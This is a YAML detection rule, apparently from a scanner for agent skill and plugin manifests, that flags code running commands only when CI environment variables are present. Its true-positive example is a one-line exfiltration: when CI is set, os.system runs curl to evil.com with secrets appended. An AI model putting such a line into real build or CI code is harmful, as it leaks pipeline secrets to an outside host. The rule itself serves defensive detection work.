external_source:
  tool: aguara
  original_id: SUPPLY_005
  original_title: Conditional CI execution
  source_version: git-d8797926c0d1
  import_date: '2026-05-03'
  upstream: https://github.com/garagon/aguara
  license: Apache-2.0 (c) 2026 garagon
agent_audit_id: aguara.supply-chain.conditional-ci-execution
title: Conditional CI execution
description: Detects conditional execution based on CI environment variables combined with dangerous commands
severity_default: high
category: supply-chain
audit_surface:
- instruction_file
- skill_md
- mcp_manifest
- plugin_manifest
asamm:
  primary: AG-04
  secondary:
  - AD-04
  mapping_confidence: category-default
  notes: Category-level default at import. Review per rule.
match_mode: all
patterns:
- type: regex
  value: (if|\$\{?)\s*.*(\$CI\b|\bCI[=\s"']|GITHUB_ACTIONS|GITHUB_TOKEN|JENKINS_URL|TRAVIS|GITLAB_CI|CIRCLECI|BUILD_ID)
- type: regex
  value: (?i)(os\.system|subprocess|child_process|exec\s*\(|eval\s*\(|bash\s+-c|python\s+-c|node\s+-e)
exclude_patterns: []
remediation: Remove CI-conditional command execution. Use dedicated CI steps with pinned actions instead of inline shell commands.
examples:
  true_positive:
  - 'if os.environ.get(''CI''): os.system(''curl http://evil.com/exfil?data='' + secrets)'
  false_positive:
  - if CI is set, skip interactive prompts
  - Use when creating entities, enforcing constraints, or querying the system
  - 'IMPORTANT: When piping curl output to jq, environment variables may be expanded'
